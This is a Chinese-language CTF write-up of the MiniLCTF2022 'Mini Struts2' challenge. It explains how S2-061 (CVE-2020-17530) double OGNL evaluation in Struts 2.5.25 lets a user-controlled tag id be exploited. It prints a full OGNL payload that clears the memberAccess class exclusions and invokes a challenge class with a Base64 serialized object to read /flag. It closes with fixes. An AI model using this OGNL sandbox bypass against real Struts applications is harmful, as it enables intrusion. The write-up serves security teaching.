# MiniLCTF2022 Mini Struts2 Writeup

## 题目简述

应用使用 Struts 2.5.25。`index.jsp` 将用户可控的 `id` 放入 `<s:a id="%{id}">`，触发二次 OGNL 求值，对应 S2-061（CVE-2020-17530）。登录 Cookie 已加密，不能直接修改；但应用中的 `Unserialize` 类可反序列化一个 `User`，当姓名为 `MiniLCTF`、年份为 `2022` 时，其 `getUsername()` 会读取 `/flag` 并返回内容。

## 解题过程

`IndexAction.setId()` 只过滤 `exec` 与 `\u`，没有阻止 OGNL 对象访问。利用链先用 Commons Collections `BeanMap` 取得 ValueStack 的 context 与 `memberAccess`，再把 `excludedPackageNames`、`excludedClasses` 替换为空集合，从而解除 OGNL 的类访问限制。

接着通过 Tomcat `InstanceManager` 实例化 `ctf.minil.utils.Unserialize`，传入预先生成的 Java 序列化流。`unserialize()` 会先从流中执行 `readUTF()` 与 `readInt()`；只要前两项分别是 `MiniLCTF` 和 `2022`，它就读取 `/flag`，构造 `User(flag, "947866")` 并直接返回。流尾还带有一个普通 `User` 对象，供条件不满足时的回退分支使用。官方 payload 中的 Base64 数据为：

```text
rO0ABXcOAAhNaW5pTENURgAAB+ZzcgAVY3RmLm1pbmlsLm1vZGVscy5Vc2VyAAAAAAAAAAECAAJMAAhwYXNzd29yZHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB+AAF4cHQABjk0Nzg2NnQABlhXYW40bg==
```

核心 OGNL 表达式如下，实际请求时需进行 URL 编码：

```text
%{(#b=#@org.apache.commons.collections.BeanMap@{})
.(#b.setBean(#request.get('struts.valueStack')))
.(#c=#@org.apache.commons.collections.BeanMap@{})
.(#c.setBean(#b.get('context')))
.(#m=#@org.apache.commons.collections.BeanMap@{})
.(#m.setBean(#c.get('memberAccess')))
.(#m.put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()))
.(#m.put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()))
.(#application.get('org.apache.tomcat.InstanceManager')
  .newInstance('ctf.minil.utils.Unserialize')
  .unserialize('<BASE64_USER_OBJECT>').getUsername())}
```

表达式的最终值成为标签 `id`，页面响应中即可看到 `/flag` 内容。这里不是利用通用 Java 反序列化 gadget 执行命令，而是调用题目自带的、具有敏感读取逻辑的方法。

## 方法总结

完整链条是“二次 OGNL 求值 → 解除 MemberAccess 限制 → 容器实例化题目类 → 反序列化合法业务对象 → 调用读取 flag 的 getter”。分析框架题时，应先确认确切版本和已知漏洞，再结合应用自定义类寻找最短效果；盲目构造通用命令执行链反而更复杂。升级 Struts、避免标签属性二次求值，并删除对不可信数据的反序列化才是根本修复。
